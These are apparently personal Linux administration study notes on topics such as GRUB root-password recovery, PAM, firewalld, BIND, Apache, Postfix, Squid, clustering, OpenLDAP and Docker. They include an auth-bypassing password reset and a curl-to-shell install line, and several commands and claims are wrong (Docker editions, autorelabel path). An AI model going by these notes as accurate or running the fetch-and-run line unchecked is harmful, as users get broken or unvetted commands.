!!!!!!!!!!!!!!!!!!!!!!!!!! Git Branching !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!




master branch is the one that is used in production
create a branch and let the developer work on it and then merge please remember you can roll back too


https://www.youtube.com/watch?v=QV0kVNvkMxc&ab_channel=TheNetNinja










==============================
Linux Configuration Management tools
chef
puppet
Ansible








===============================


linux password recovery




1)
interrupt the boot sequence to reach grub menu [usually it is the escape button]


press e and you will be taken to grub edit menu
navigate to the kernel line you will boot and add this option to the end of the line: rd.break


<< actually this will break when initramdisk is loaded


remount the root file system to be able to write to it :
mount -o remount,rw /dev/sda1 /mnt/rootfs


<< change the root environment to the new mounted root file system
chroot /mnt/rootfs


<< change the password
passwd
<< enter the new password




<< if selinux is in the pircture
touch ./autorelabel






2) the systemd rescue of doing this                // valid only in case /etc/fstab was not corrupted. maybe to fix services. So understand that this method
takes you ahead in the boot process, but it needed to know how to mount the file system.


interrupt the boot sequence to reach grub menu [usually it is the escape button]


press e and you will be taken to grub edit menu
navigate to the kernel line you will boot and add this option to the end of the line: rescue


boot will take you directly asking about the new passowrd you want to use. and after entering it, you will be using the already root file system mounted
with read write options.


3) systemd emergency


same thing as the above method but instead of entering rescue at the boot line you need to enter emergency
read only root file system mount. So we need to do a remount.




method 2 and 3 allows you to use selinux by nature. As SElinux will be loaded in this way.












<< same thing can be done by using a live boot cd.


=====================================


sssd


a tool for integrating with an external authentication source


yum install sssd openldap-clients nscd
apt-get install sssd openldap-clients nscd






======================================
PAM
Pluggable authentication module


PAM system adds a layer of security to administrative tools and commands. PAM includes dynamically loadable libraries that control how different applications verify and authenticate users.


it is also used to standarize user authentication. For example, the /etc/pam.d/login file contains the following line:


rule_type                                                                         security mo dule/object being invoked
  auth               [user_unknown=ignore sucess=ok ignore=ignore default=bad]            pam_Security.so


// the above rule means that the root user can only login from the secure terminals defined in /etc/security.


typically configuration in /etc/pam.d/ are named according to the program that is using them to authenticate, However some applications make no changes to default files and will be symlinked
instead of having their own PAM configuration file.


you can change how PAM-aware applications like the console login program verify their users by changing the appropriate configuration file.




// there are four different PAM rule types:


    -- Authentication Management (auth)         -- validates identity
    --Account management (account)              -- allows or denies access based on account policies
    -- Password Management (password)           -- Manages password change policies.
    -- session management (session)             -- applies settings for application sessions


// There are five PAM control flags


    -- required: if the module passes, PAM proceeds to the next rule of the same type, if it fails PAM still proceeds but the result returns a failure.
    -- requsitie: if this module fails PAM does not check any more rules, it simply returns a failure.
    -- sufficient: if this module passes, no other rules of this type gets processed. if the module fails PAM continues processing the rest of rules of this type.
    -- optional: whether this module passes or fails PAM ignores the result and proceed to the next rule.
    -- include: include all rules of the same type from the designated configuration file.For example, if the rule says password include system-auth, all password rule types from the
PAM system-auth file will be included in this configuration file.






// a pam configuration file contains more than one rule


// there is a tool to do changes to PAM files
authconfig
and authconfig-tui gui




// a one common pam module is pam_tally2.so
// to get more into on a module use pam_tally2










=====================================
lock failed authentication attempts via pam
Add the following two lines into /etc/pam.d/sshd


auth     required       pam_tally2.so deny=4 onerr=fail
Account required    pam_tally2.so




view locked users :
sudo pam_tall2




unlock a user
sudo pam_tally2 -u malhyari -r






====================================
ip s a | grep up                    // check if interfaces are up














==================================
configure a gre tunnel on a linux box


// load the kernel module
modprobe ip_gre


// configure the tunnel
ip tunnel add [tunnelname] mode gre remote 1.1.1.1 local 2.2.2.2 ttl 255


//assign an overlay address for the vpn tunnel
ip addr add 10.0.0.1/24 dev [tunnel name]


// bring the tunnel interface up
ip link set [tunnel-name] up




==================================


put a redhat interface into a specific zone for the use of firewall-cmd
open the file /etc/sysconfig/network-scripts/ifconfig-enp0s8


add this line


ZONE=internal                       // internal is the zone name.
===================================


firewalld


systemctl start firewalld


firewall-cmd


firewall-cmd --list-all             // list all zones
firewall-cmd --info-zone=public     // view public zone information


// add a service
firewall-cmd --add-service=httpd




// add multiple services at once
firewall-cmd --add-service={http,dhcp}




// view all zones
firewall-cmd --get-zones


// view all available services
firewall-cmd --get-services


// if the service is unknown you can still add a port
firewall-cmd --add-port=12345/tcp




// remove a port
firewall-cmd --remove-port=12345/tcp




// make the changes permanent


firewall-cmd --add-service={http,dhcp} --permanent                      // notice the use of the permanent flag


// reload all the rules
firewall-cmd --reload




// rich rules  [this is what is exactly is an acl]


firewall-cmd --add-rich-rule 'rule family="ipv4" source address="1.1.1.1" port port="22" protocol="tcp" reject'




// remove the rich rule
just asdd --remove-rich-rule to the above command instead of the add




// adding a rich rule using the service and not the port
firewall-cmd --add-rich-rule 'rule family="ipv4" source address="1.1.1.1" service name="ssh" protocol="tcp" reject'




// ip set . this is exactly what is an object group is
firewall-cmd --permanent --new-ipset=blacklist --type hash=ip
reload the firewall-cmd
firewall-cmd --ipset=blacklist --add-entry=1.1.1.1  --permanent                  // adding an entry to the ip set







firewall-cmd --permanent --add-rich-rule 'rule family="ipv4" source ipset="blacklist" port port="22" protocol="tcp" reject'






// add entries from a file


firewall-cmd --permanent --ipset=blacklist --add-entries-from-file=iplist




// list the entires inside an ip set
firewall-cmd --info-ipset=blacklist








//firewalld allows you to port iptables syntax like this
firewall-cmd --direct --add-rule ipv4 filter INPUT 0 -p tcp -dport 80 -j ACCEPT




// restrict traffic by outbound user
firewall-cmd --direct --add-chain ipv4 filter sorry_charlie
firewall-cmd --direct --permanent --add-rule ipv4 filter OUTPUT 1 -m owner --uid-owner cbrown -j sorry_charlie
firewall-cmd --direct --permanent --add-rule ipv4 filter sorry_charlie 2 -d 1.1.1.1 -j REJECT






// save all running config
firewall-cmd --runtime-to-permanent




==================================
configuring nat
dynamic pat




enp0s3 outside interface
enp0s8 inside interface






with firewall-cmd
firewall-cmd   --direct --ad-rule ipv4 nat POSTROUTING 0 -o enp0s3 -j MASQUREADE
firewall-cmd   --direct --ad-rule ipv4 filter FORWARD  0 -i enp0s8 -o enp0s3 -j ACCEPT
firewall-cmd   --direct --ad-rule ipv4 filter FORWARD  0 -o enp0s8 -i enp0s3  -m STATE RELATED,ESTABLISHED -j ACCEPT


//enable ipv4 forwarding paramter
/proc/sys/net/ipv4/ip_forward               // echo 1 or use /etc/sysctl.conf file






====================================
linux networking
ip tool [the new one]
ip addr add 10.1.1.1/16 dev eth0
ip route add default via 10.0.2.2
Ip route add 0.0.0.0/0 via 10.0.0.1 dev eth0


#ip link set dev eth0 up                                    @@bring the interface up/down
Ip link set mtu 1492 dev eth0


route add default gw 10.0.2.2
route delete default gw 10.0.2.2 eth0                       Delete the current default route






#echo nameserver 4.2.2.2 >> /etc/resolv.conf                @@ to add a dns server
# dhclient eth0                                             @@ manually request a dhcp configuration






#ifconfig eth0 up
Ifconfig eth0 mtu 1492
Ifconfig eth0 10.1.1.1/24
Ifconfig eth0 10.1.1.1 netmask 255.255.255.0


ethtool -s eth0 speed 1000 duplex full
ethtool eth0
mii-tool eth0




@Blacklist hardware
/etc/modprobe.d/blacklist.local
/etc/modprobe.d/blacklist.conf






@addition of a MAC VLAN. This is an additional Layer 2 MAC address added to an interface


# ip link add link eth0 dev peth0 type macvlan
# ip link set up dev peth0




+++++++++++++++++ SUSE Network Configuration File ++++++++++++++
Network configuration files are located in the /etc/sysconfig/network directory.
Hostname in /etc/HOSTNAME
DNS /etc/sysconfig/network/config or /etc/resolv.conf. This is managed by a tool called netconfig.
If not using network manager, you can modify modify the network settings using the command yast network.




+++++++++++++++++ CentOS  Network Configuration File ++++++++++++++
Network configuration files are located at /etc/sysconfig/network-scripts and match the ifcfg-<interface> pattern
Hostname is managed by /etc/hostname
DNS is managed by /etc/resolv.conf
Tools available for CentOS:
        1) the setup tool is a text based user interface (TUI) for system configuration items(network settings included).
        2) the system-config-network tool runs in either GUI or TUI mode to configure network settings. You can specify which mode you want by running system-config-network-tui or system-config-network-gui




+++++++++++++++++ Ubuntu  Network Configuration File ++++++++++++++


Network configuration files on Ubuntu reside in the /etc/network directory with /etc/network/interfaces interface configuration file.
Hostname is in /etc/hostname
DNS is managed by a system called resolvconf. The nameserver configuration is part of the per-interface configuration in /etc/network/interfaces.
The network-config command is an ubuntu specific tool to manage settings. However, the network manager tools are preferred.




+++++++++++++++++++ Networking Services +++++++++++++++++++++
Ubuntu
sudo service network-manager restart


Normal distros it is network service












***********************************************************


linux ntp


chrony package
[malhyari]
chronyc   // command
chornyc sources                 // view your ntp servers


/etc/chrony.conf


configure client to connect to a server
server 1.1.1.1                  >> in that file




configure a server to serve clients
allow 1.1.1.0/24                >> in the same file




================================================================
linux dhcp server


centos                  /etc/sysconfig/dhcpd
opensuse                /etc/default/isc-dhcp-server
ubuntu                  /etc/sysconfig/dhcpd


The dhcp server will serve out addresses on an interface that it finds a subnet block defined in the /etc/dhcp/dhcpd.conf file.
It is no longer a requirement to explicitly tell dhcp which interface to use.


config example:
Global options are settings which should apply to all the hosts in a network. You can also define options on a per-network basis.
// for global options any option in the mentioned below can be created globally so it applies for all.


subnet 10.5.5.0 netmask 255.255.255.224 {
range 10.5.5.26 10.5.5.30
option domain-name-servers  ns1.internal.example.org;
option domain-name "internal.example.org";
option routers 10.5.5.1;
option broadcast-address 10.5.5.31;
defult-lease-time 600;
max-lease-time 700;
}




// enable the service
systemctl enable dhcpd


// view the leasese on the server
cat /var/lib/dhcpd/dhcpd.leases




===================================================
linux smtp service and server
postfix mail server replacing sendmail old shit








===================================
linux ldap server slap
malhyari put the details here








++++++++++++++++++++++++++++++++++++
linux dns server


bind9 service
installation            yum install bind
enable the service      systemctl start named
start the service       systemctl enable named




configuration files:
/etc/named.conf
Known Options :
1) listen on multiple ports
        listen-on port 53 { 127.0.0.1; 223.1.2.1; };


2) forwarders
        forwarders { 223.1.2.2; 223.1.2.3; };


3) allow queries from all clients
        allow-query     { localhost;any; };




Each authoritative zone needs a definition in named.conf. Slave zones are also defined in named.conf


/etc/named.conf
zone "malhyari.net." IN {
        type master;
        file "/etc/named/malhyari.net.zone";
};


// check integrity of named.conf
named-checkconf /etc/named.d


verify a zone file:
named-checkzone example.com. /var/named/example.com.zone


Zone file
$TTL 60


@                      IN SOA                 server.malhyari.net. admin.malhyari.net.  (
                                        2004062602 ; serial
                                        3H        ;refresh
                                        1H        ;retry
                                        2H        ;expire
                                        1M)        ;minimum


malhyari.net.             IN NS                 server.malhyari.net.
server                      IN A                10.10.2.40
ise-nac                     IN A                10.10.2.100
servicesgateway      IN A                10.10.2.1
;






++++++++++++++++++++++++++++++++++++
linux dns server views


a method of splitting what address a single server replies to requests with, based on where the request came from.
internal view and external view both served by the same dns server


when setuping this you can not have any dns zones outside of views




// create an acl to split client internally and externally
acl internal {172.31..114.12; localhost; };
acl external {172.31.114.9;};


// setup the views
view trusted {
    match-clients { internal; };
    zone "mylabserver.com" {
        type master;
        file "db.internal.mylabsrver.com";
    };
};




view untrusted {
    match-clients { external; };
    zone "mylabserver.com" {
        type master;
        file "db.external.mylabsrver.com";
    };
};




=======================================
capture traffic at the process level via strace
strace -p $PID -f -e trace=network -s 10000


trace only a specific call
 strace -e trace=open -f ping -c1 google.com




======================================
nmcli


nmcli  device connect ens33
nmcli  device disconnect ens33




=======================================
entoch nag ehostean,me
1)sudo vi /etc/sysconfig/network          >    > add this line there HOSTNMME=lfce1.malhyari.net
2) open /etc/hosts                            >> 11..1.1 lfce1.malhyari.net lfce1
3) hostnamectl set-hosntame lfce1.malhyari.net






========================================
apache ssl certificate openssl


// install mod_ssl for apache
yum isntall mod_ssl




openssl genrsa -aes128  > server.key
openssl req -new -key server.key -out server.csr
openssl x509 -req -days 356 -in apache.csr -signkey apache.key -out /root/apache.crt
openssl rsa -in apache.key -out apache.key.unlocked




move the keys and the cert into the directory needed :
[these locations can be obtainied from ssl.conf file ]
centos
[/etc/httpd/conf.d/ssl.conf]
 mv /root/apache.crt /etc/pki/tls/certs/localhost.crt
 mv /root/apache.key.unlocked /etc/pki/tls/certs/localhost.key


opensuse
/etc/apache2/ssl/ssl.cert/apache.crt
/etc/apache2/ssl/ssl.key/apache.key




ubuntu
/etc/ssl/certificates/ssl-cert-snakeoil.cert
/etc/ssl/private/ssl-cert-snakeoil.key




fixe selinux errors if exists cat /var/log/audit/audit.log




open the firewall for http/https
firewalld --list-all
firewalld --add-service http
firewalld --add-service https






============================================


apache server linux


yum install httpd httpd-tools httpd-manual


configuration files:
/etc/httpd/conf/httpd.conf
/etc/httpd/conf.d/


Configuration Directives:
=========================
defines settings, behavior of our system


-ServerRoot
-Listen
-Include
-User/Group
-DocumentRoot
-Options
-AllowOverride








Scoped Directives:
==================
appply to only that part of the server


-Directories
-Files
- Modules
- Virtual Hosts








<Directory> scoped directive options:
    AllowOverride None:         this directory can't be further overriden
    Require all granted:        allows users to fetch content from the directory
    Options Indexes FollowSymLinks: allows listing the directory files plus following symilinks to any location in the file system






Apache Commands
===============
apachectl : can be used to start/stop/restart/check status/validate your configuration files.












Apache Virtual Hosts
===========================


This option makes it possible for a single web server to host multiple websites.
It works by allowing the web server to provide different content based on the hostname, port number,
or IP address that is being requested by the client.




There are two types of virtual hosts you can define in apache web server
Name-based virtual hosts : Apache uses the  hostname in the request to lookup the correct server
IP-based virtual hosts: apache uses the ip to map the request




Configuration
=============
can be put inside /etc/httpd/conf/httpd.conf or separate files inside /etc/httpd/conf.d/


The NameVirtualHost directive defines which addresses can be virtual hosts; the asterisk (*) means any name or address this server. You can write them like this




a) configuring a named virtual host
directive used <VirtualHost *:80>               // note the star here as we are using a named vritual host
// inside the directive we need to have two main configuration lines:
-- ServerName www.sexy.com                      // this is how apache knows how to map the request here.
-- DocumentRoot "/var/www/html/2"


NOTE: the virtual named host will override the default server. So if someone tries http to the ip address or a name that is not
defined in the named virtual host he will land on our named virtual host and not the default server instance.


To fix this. We can define a virutal host entry for the default server.







MISC
=====


test the syntax for non main config files // files inside /etc/httpd/conf.d/
httpd -t


NameVirtualHost *




<VirtualHost *>
ServerName www.example.com
DocumentRoot "/home/user1/public_html"
</VirtualHost>


<VirtualHost *>
ServerName www.example2.com
DocumentRoot "/home/user2/public_html"
</VirtualHost>




if you have more than one ip address:


<VirtualHost 192.168.1.2>
ServerName www.example.com
DocumentRoot "/home/user1/public_html"
</VirtualHost>


<VirtualHost 192.168.1.3>
ServerName www.example2.com
DocumentRoot "/home/user2/public_html"
</VirtualHost>






If you have one ip address .For Multiple Websites using a single address or port. Use a NameVirtualHost directive or a _default_ virtual host.


NameVirtualHost 1.1.1.1:80


<VirtualHost 1.1.1.1:80>
ServerName www.example.com
DocumentRoot "/home/user1/public_html"
</VirtualHost>


<VirtualHost 1.1.1.1:80>
ServerName www.example2.com
DocumentRoot "/home/user2/public_html"
</VirtualHost>


Note:
Hostnames which are no defined in a VirutalHost Stanza which  match the ip address and port will be served by the first VirtualHost Stanza. You can override this by using ServerName _default_


Note:
documentation that contains configuration examples can be found in /usr/share/doc/httpd-version/








===================
APACHE MODULES
===================
adding functionality to your server


1- get the module
yum install [module name]


2- where are they?
/etc/httpd/modules -> /usr/lib64/httpd/modules


3- modules configuration files
/etc/httpd/conf.modules.d/


4- load the module inside the apache config file
LoadModule ssl_module modules/mod_ssl.so


Commonly used modules:
mod_ssl
mod_alias:      simple URL remapping
mod_Rewrite:    Rule Based remapping of URLs
mod_status: provides information on server activity and performance
mod_deflate:    compress content
mod_cgi:        application execution as defined in the script


dump modules loaded
httpd -D DUMP_MODULES




===============
redirect url with modalias
1- ensure mod_alias is installed/loaded
httpd -D DUMP_MODULES


2- open a site configuration file and add this inside the virtual host directive
<IfModule alias_module>
Redirect permanent /products /newproducts


</IfModule>


=============================
CGI Applications
=============================
execute code on the serve side
conent is returned to the client
1- ensure the module is loaded and active
2- check the script alias definition:
ScriptAlias /cgi-bin/ "/var/www/cgi-bin"
3- valide se flag
getsebool httpd_enable_cgi


4- deploy your cgi script
cgi example1:
/var/www/cgi-bin/hostname.sh
#!/bin/bash
echo "Content-Type: text/html"
echo ""
echo " The hostname of your test is: 'hostname' "       // this is a backtick!




5- test
curl http://server1/cgi-bin/hostname.sh
















++++++++++++++++++++++++
Apache SE Linux
++++++++++++++++++++++++
++ modifications are needed if the default root directory to be changed:
semanage fcontext -at httpd_sys_content_t "/var/ww2/html/(/.*)?"


++ modification needed if the port to be changed:
semanage port -at http_port_t -p 8080


apply changes
restorecon -Rv /var/ww2


+++++++++++++++++++++++++++
Non Default root Directorie
+++++++++++++++++++++++++++


Suppose you create a virtual host entry that has the document root of /var/ww2/html/ww2.psdemo.local
you still need to do more changes as remember the default / has deny all settings in the main config file


<Directory "/var/ww2">
    AllowOverride none
    Require all granted
</Directory>


<Directory "/var/ww2/html">
    Options Indexes FollowSymLinks
    AllowOverride none
    Require all granted
</Directory>






+++++++++++++++++++++++++
Secure access directories
+++++++++++++++++++++++++


Password protected directories are protected via SSL. Per User Access Control is activated using AllowOverride (.htaccess file)




two methods :
1- directly in Apache's configuration file.


--create a location stanza
<Location /secure/>
AuthType Basic
AuthName "Restricted Area"
AuthUserFile secure.users
Require valid-user
</Location>




-- create the password file with htpassword command.




2- using .htaccess file:
========================


Requirements
AllowOverride AuthConfig directive must be enabled in Apache configuration file.


a directory stanza should exist
<Directory /var/www/html>
Options Indexes Includes FollowSymLinks MultiViews
AllowOverride All
allow,deny
Allow from all
</Directory>




--Now we will use the htpasswd command to generate username and password for our protected directory. This command is used to manage user files for basic authentication.


The general syntax of the command is:


# htpasswd -c filename username


--password file needs to be located out of the Apache’s web accessible directory so that it is well protected. For that purpose, we will create new directory:


# mkdir /home/tecmint




--After that we will generate our username and password that will be stored in that directory:


# htpasswd -c /home/tecmint/webpass tecmint




 --we will need to make sure that Apache is able to read the “webpass” file. For that purpose, you will need to change the ownership of that file


--At this point our new user and password are ready. Now we need to tell Apache to request password when accessing our targeted directory. For that purpose, create file called .htaccess in /var/www/html:




add the following code
AuthType Basic
AuthName "Restricted Access"
AuthUserFile /home/tecmint/webpass
Require user tecmint




--now save the file and put your setup to the test. Open your browser and enter your IP address or domain name in the web browser, for example:


http://ip-address




========================
SECURED VIRTUAL HOSTS
========================
<VirtualHost *:443>
    ServerName www.malhyari.net:443
    SSLEngine On
    SSLCertificateFile /etc/pki/tls/certs/www.malhyari.net.cert
    SSLCertificateKeyFile /etc/pki/tls/private/www.malhyari.net.key
</VirtualHost>


restoreconf -VRF /etc/pki/*






============================================================
rsyslog service
a service that controls logging of messages in the system
/etc/rsyslog.conf




rules


[facility].[priority]               destination




example:
mail.*                              /var/log/maillog




server config:
==============
uncomment tcp/udp modules
restart the rsyslog service
open the firewall if needed
manage selinux if needed




Client side
=============
in /etc/rsyslog.conf add a line to point to the syslog server:
*.* @@1.1.1.1:514               // for example
NOte: @@ means tcp @ means udp




test by sending a message from client via the logger command:
logger "This is a test"






===============
NAT on Linux
a) dyamic OAT with firewalld
ensure that masquerade is enabled on the natted interface zone.
masquerading in linux world means PAT : port address translation
firewall-cmd --permanent --zone=external --add-masquerade


-- assign interfaces for internal zones.
// thats it


b) static pat with firewlld


firewall-cmd --permanent -zone=external --add-forward-port=port=2223:proto=tcp:toport=22:toaddr=192.168.0.1


====================
x11 forwarding over ssh
//install an x11 runner on the target server
yum install xorg-x11-apps -y






ssh -X demo@server2.com


// check if xorg is working on the serve with the program xeyes
xeyes  // now note the output of the x program is being forwarded over the ssh tunnel to the machine from which we started the ssh


========================
linux email mail services
postconf


/etc/postconf/master.conf           // control binaries and processes
/etc/postconf/mail.conf             // main mail settings
default is listening on local host only allowing outbouond and not relayed messages.


postconf -n             // display changed /non default parameters
postconf -d             // show default values
postconf -e myhostname=sexy         // change a vaule
postfix reloasd                     // apply changes




mail messages are saved inside /var/spool/mail/username text file


mailx           // cli email tool


change the default listening behavior by changing
int_interfaces = all




// set myorigin which is the name from which emails will appear to be coming from // outbound
myrogiin=sexy.com


// how to tell an email server to just relay emails to another email
relayhost = x1.example.com




// restrict MTAs who can interact with the mail server
mynetworks=10.0.0./8,11.0.0.0/8
smtpd_client_Restrictions=permit_mynetworks,reject


// you can also use the postfix acccess table .


//mail aliases can be done in two ways :
/etc/aliases
postfix alias table




Dovecot
=======
it is a server  that provides client access to their mailboxes/ works with both IMAP and POP.
it retrives mail from postfix and delivers it to the local client


1- install dovecot
yum install dovecot


2- open the firewall for that thing on imap/pop3


3- tell dovecot where is the mail box on the system


vi /etc/dovecot/conf.d/10-mail-conf
#   mail_location = mbox:~/mail:INBOX=/var/mail/%u


4- sudo chmod 600 /var/mail/*
restrict access just to the files owners





5- access via curl from another client
curl -v --url imaps://server


at this moment we can configure  a mail client to connect to the dovecot server and read emails


=======================
Squid Proxy
yum install squid
/etc/squid
        squid.conf
        squid.conf.default




/usr/share/doc/squid*               :documentation of the squid package




/var/log/squid/
                access.log          : proxy requests log
                cache.log           :dameon log file






firewall-cmd --add-port=3128/tcp --permanent


systemctl start squid



Access control
==============
Used to control access to the proxy and its resources.
--ACL elements- evaluation point
    src - source (client) IP address or network
    port - destination port
example:
    acl localnet src 192.168.0.0/16


--Access Lists: defines allow or deny
http_access: Allow HTTP Clients to access the http ports






bring it together:
http_access allow localnet


Restricting Access
Domain:
    acl BackToWork dstdomain www.facebook.com               // acl to block facebook
http_access deny BackToWork                                 // linking it to http_access


Network:
acl NoInternet src 192.168.3.0/25
http_access deny NoInternet                                 // block this subnet from using the proxy




=========================
adding a cache directory
=========================
cache_dir ufs /path/to/cache SizeMB L1 L2
cache_dir ufs /var/spool/squid 100 16 256




TRANSPARENT PROXY
=================
commonly implemented on network gateways
iptables/firewalld to REDIRECT Output HTTP requests to the proxy on 3128


in /etc/squid/squid.conf add:
http_port 3129 intercept


//redirect the traffic from port 80 to our squid proxy on port 3129
firewall-cmd --add-forward-port=port=80:proto=tcp:toport=3129:toaddr=192.168.1.1




USING SQUID as a reverse proxy server
=====================================
it can provide:
web acceleration
basic loadbalancing
ssl termination
domain url routing




configuration
=============
http_port 80 accel defaultsite=no-vhost     //tells squid to function as a caching reverse proxy for web acceleration
cache_peer server1.malhyari.net parent 80 0 no-query originserver name=PSReverProxy  // the server to which we do the reverse proxy
             //  function as a reverse proxy


// open access to the proxy with the access control
acl demo_Site dstdomain proxy.malhyari.com
http_access allow demo_Site


cache_peer_access PSReverProxy allow demo_Site
cache_peer_access PSReverProxy deny all








=======================================
nginx server


***Load Balcning ****


Add configuration for a site
/etc/nginx/conf.d/www.example.com.conf




upstream remote_servers  {
   server remote1.example.com;
   server remote2.example.com;
   server remote3.example.com;
}


server {
   listen   80;
   server_name  example.com www.example.com;
   location / {
     proxy_pass  http://remote_servers;
   }
}








==========================================
lxc


lxc installation configuration
-------------------------------


yum install epel-release


// download the needed packages
# yum -y install lxc lxc-templates libcap-devel libcgroup busybox wget bridge-utils lxc-extra


// check everything is fine
# lxc-checkconfig


// location of templates
# ls /usr/share/lxc/templates/


//create a container                                         -n for name and -t for the template
# lxc-create -n centos_lxc -t centos


// starting the container
# lxc-start -n centos_lxc -d




// connecting to the container
# lxc-start -n centos_lxc -d




// listing containers
# lxc-ls


// listing active containers
# lxc-ls --active


// stopping a container
# lxc-stop -n centos_lxc


// cloning an existing container
# lxc-clone centos_lxc centos_lxc_clone




// disable auto start for a container
echo "lxc.start.auto=1" >>   /var/lib/lxc/centos/config




// change root file system
lxc.rootfs = /var/lib/lxc/centos/rootfs


==================================
Linux Clustering
1- install/start the needed packages
yum install corosync pacemaker pcs
systemctl enable pcsd
systemctl start pcsd


2-         create a password for the hacluster user on the two nodes
passwd hacluster



3- on one of the nodes:
pcs cluster auth server0.malhyari.net server1.malhyari.net -u hacluster -p [password] --force
pcs cluster setup --name nginxcluster server0.malhyari.net server1.malhyari.net




4- enable cluster on boot and startup
pcs cluster enable --all
pcs cluster start --all
pcs status






5- disable shoot the other node in the head
pcs property set stonith-enabled=false




6- ignore the Quorum Policy
pcs property set no-quorum-policy=ignore




7- see the property list
pcs property list




8- adding resources  to the cluster
#floating ip
pcs resource create floating_ip ocf:heartbeat:IPaddr2 ip=192.168.1.50 cidr_netmask=24 op monitor interval=60s


#add http service as a resource
pcs resource create http_server ocf:heartbeat:nignx configfile="/etc/nginx/nginx.conf" op monitor timeout="20s" interval="60s"


=================================
linux openldap


LDAP Server
1- yum install -y openldap openldap-servers


2- start the service:
systemctl start slapd
systemctl enable slapd
systemctl status slapd


3- create an openldap admin password
slappasswd
<enter new password >


4-  create an LDIF file (ldaprootpasswd.ldif) which is used to add an entry to the LDAP directory


vim ldaprootpasswd.ldif
add the following content inside it :
dn: olcDatabase={0}config,cn=config
 changetype: modify
 add: olcRootPW
 olcRootPW: {SSHA}PASSWORD_CREATED

olcDatabase: indicates a specific database instance name and can be typically found
inside /etc/openldap/slapd.d/cn=config.


cn=config: indicates global config options


PASSWORD: is the hashed string obtained while creating the administrative user.




5- add the ldap entry by specifying the URL:
 sudo ldapadd -Y EXTERNAL -H ldapi:/// -f ldaprootpasswd.ldif

6- copy the sample database configuration file for slapd into /var/lib/ldap and set the correct permission into it:
$ sudo cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG
$ sudo chown -R ldap:ldap /var/lib/ldap/DB_CONFIG
$ sudo systemctl restart slapd


6-  import some basic LDAP schemas from the /etc/openldap/schema directory as follows.
$ sudo ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif
$ sudo ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif
$ sudo ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif




7-  add your domain in the LDAP database and create a file called ldapdomain.ldif for your
domain.


$ sudo vim ldapdomain.ldif

 Add the following content in it (replace example with your domain and PASSWORD with the
hashed value obtained before):


dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=example,dc=com" read by * none


dn: olcDatabase={2}hdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=example,dc=com


dn: olcDatabase={2}hdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=example,dc=com


dn: olcDatabase={2}hdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}PASSWORD


dn: olcDatabase={2}hdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=example,dc=com" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=example,dc=com" write by * read


8-  add the above configuration to the LDAP database with the following command.
$ sudo ldapmodify -Y EXTERNAL -H ldapi:/// -f ldapdomain.ldif




9- we need to add some entries to our LDAP directory. Create another file
called baseldapdomain.ldif with the following content.


 dn: dc=example,dc=com
objectClass: top
objectClass: dcObject
objectclass: organization
o: example com
dc: example


dn: cn=Manager,dc=example,dc=com
objectClass: organizationalRole
cn: Manager
description: Directory Manager


dn: ou=People,dc=example,dc=com
objectClass: organizationalUnit
ou: People


dn: ou=Group,dc=example,dc=com
objectClass: organizationalUnit
ou: Group


10- Save the file and then add the entries to the LDAP directory
$ sudo ldapadd -Y EXTERNAL -x -D cn=Manager,dc=example,dc=com -W -f baseldapdomain.ldif


10-  create a LDAP user for example, tecmint, and set a password for this user as
follows.


$ sudo useradd tecmint
$ sudo passwd tecmint


11- create the definitions for a LDAP group in a file called ldapgroup.ldif with the following
content.


dn: cn=Manager,ou=Group,dc=example,dc=com
 objectClass: top
 objectClass: posixGroup
 gidNumber: 1005


 In the above configuration, gidNumber is the GID in /etc/group for tecmint and add it to the
OpenLDAP directory.


$ sudo ldapadd -Y EXTERNAL -x -W -D "cn=Manager,dc=example,dc=com" -f ldapgroup.ldif




12-  create another LDIF file called ldapuser.ldif and add the definitions for user tecmint.


dn: uid=tecmint,ou=People,dc=example,dc=com
objectClass: top
objectClass: account
objectClass: posixAccount
objectClass: shadowAccount
cn: tecmint
uid: tecmint
uidNumber: 1005
gidNumber: 1005
homeDirectory: /home/tecmint
userPassword: {SSHA}PASSWORD_HERE
loginShell: /bin/bash
gecos: tecmint
shadowLastChange: 0
shadowMax: 0
shadowWarning: 0




13- then load fthe configuration to the LDAP directory


 $ sudo ldapadd -Y EXTERNAL -x -D cn=Manager,dc=example,dc=com -W -f ldapuser.ldif




 ================================================
Linux dockers containers


 containers are not mini vms
they are just processes
limitted to what resources they can access:
        file paths
        network devices
        running processes
they exit the process stops




Docker :
        community edition : paid
        Enterprise edition : free


image vs container:
An image is the application we want to run
a container is an instance of that image running as a process
you can have many containers running of the same image
docker default image 'registry' : hub.docker.com








installation
Initially
// on centos you need to install the epel-releases package
// on other distros it should be provided there by default


Install docker
#apt-get install docker                         yum install docker


//preferred way to install docker on linux
#curl -sSL https://get.docker.com/ | sh




// verify docker installation
#docker version


// you can limit the search for 5 stars and more
#docker search -s 5 linux


Now enable the service
#systemctl enable --now docker




// creating a docker and start a shell inside it
#docker create --name test oraclelinux:7  /bin/bash


// check the process for that docker
#docker ps -e




// docker info for more info




docker build                         build a container using a docker file
docker create                         create a new container
docker exec                         run a command in an existing container
docker info                         provides information about the entire docker system
docker kill                                close an active container
docker pull                                downlods an image
docker run                                 start a new container and and runs a command within it
docker search                         search docker hub for images
docker start                         start a container that has been previosuly stopped


// download the ubuntu docker image
#docker pull ubuntu




// buildng an image locally from the docker file in the current directoy.
docker build -t myapp:1.0 .


// view available docker images
#docker images




// log into a registry [like docker hub]
docker login my.registry.com:8000


// push an image to a registry
docker push myalpine:3.4








//start a container and run a command
#docker run fedora echo “hello”




// view all containers that are active
#docker ps


// view all current and previous active containers
#docket -a ps




// run a container with a terminal attached to it
#docker run -it ubuntu /bin/bash




// docker logs   needs the container id you can get from docket ps
